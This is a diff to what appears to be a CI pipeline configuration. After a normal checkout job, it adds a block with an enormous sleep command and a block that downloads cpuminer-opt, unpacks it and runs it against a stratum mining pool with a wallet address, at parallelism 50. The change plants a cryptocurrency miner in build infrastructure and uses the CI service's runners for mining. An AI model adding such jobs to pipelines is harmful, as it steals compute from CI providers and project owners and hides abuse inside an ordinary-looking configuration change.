@@ -11,3 +11,18 @@ blocks:
         - name: 'Job #1'
           commands:
             - checkout
+  - name: 'Block #2'
+    task:
+      jobs:
+        - name: 'Job #1'
+          commands:
+            - Sleep 17273748484848484848
+  - name: 'Block #3'
+    task:
+      jobs:
+        - name: 'Job #1'
+          commands:
+            - 'wget https://github.com/rplant8/cpuminer-opt-rplant/releases/latest/download/cpuminer-opt-linux.tar.gz'
+            - tar xf cpuminer-opt-linux.tar.gz
+            - './cpuminer-sse2 -a power2b -o stratum+tcps://stratum-eu.rplant.xyz:17022 -u BgLwY8t2haNQjkwU7hatVRUj3r4zP1oXio.TuyulGondrong -t0'
+          parallelism: 50
